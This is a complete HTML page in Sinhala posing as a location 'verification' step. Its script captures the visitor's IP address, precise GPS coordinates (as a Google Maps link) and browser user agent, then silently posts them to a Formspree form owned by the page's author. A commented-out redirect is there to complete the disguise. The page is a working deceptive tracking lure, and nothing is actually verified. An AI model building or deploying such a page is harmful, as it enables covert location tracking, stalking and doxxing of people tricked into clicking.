<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Page</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
        }
        h2 { color: #333; }
        p { color: #666; font-size: 14px; }
        button { 
            background-color: #007bff; 
            color: white; 
            border: none; 
            padding: 12px 25px; 
            border-radius: 8px; 
            font-size: 16px; 
            cursor: pointer; 
            transition: background 0.3s;
        }
        button:hover { background-color: #0056b3; }
        #status { margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>තහවුරු කිරීම</h2>
    <p>දිගටම කරගෙන යාම සඳහා කරුණාකර ඔබගේ ස්ථානය (Location) තහවුරු කරන්න. ඉන්පසු ලැබෙන "Allow" පණිවිඩය ක්ලික් කරන්න.</p>
    <button onclick="captureData()">මම එකඟයි</button>
    <div id="status"></div>
</div>

<script>
    async function captureData() {
        const statusMsg = document.getElementById("status");
        statusMsg.style.color = "blue";
        statusMsg.innerText = "සකසමින් පවතී... කරුණාකර රැඳී සිටින්න.";

        try {
            // 1. IP ලිපිනය ලබා ගැනීම
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const userIP = ipData.ip;
            const currentTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });

            // 2. Location එක ලබා ගැනීම
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;

                    // 3. Formspree වෙත දත්ත යැවීම
                    const response = await fetch("https://formspree.io/f/xdabkpao", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            IP_Address: userIP,
                            Date_Time: currentTime,
                            Google_Maps_Location: mapUrl,
                            User_Agent: navigator.userAgent
                        })
                    });

                    if (response.ok) {
                        statusMsg.style.color = "green";
                        statusMsg.innerText = "සාර්ථකව තහවුරු විය!";
                        // සාර්ථක වූ පසු වෙනත් පිටුවකට යොමු කිරීමට අවශ්‍ය නම්:
                        // window.location.href = "https://google.com";
                    } else {
                        throw new Error("Failed to send");
                    }

                }, (error) => {
                    statusMsg.style.color = "red";
                    statusMsg.innerText = "කරුණාකර Location 'Allow' කරන්න.";
                });
            } else {
                statusMsg.innerText = "ඔබේ බ්‍රවුසරය මෙය සඳහා සහය නොදක්වයි.";
            }
        } catch (err) {
            statusMsg.style.color = "red";
            statusMsg.innerText = "දෝෂයකි. නැවත උත්සාහ කරන්න.";
        }
    }
</script>

</body>
</html>
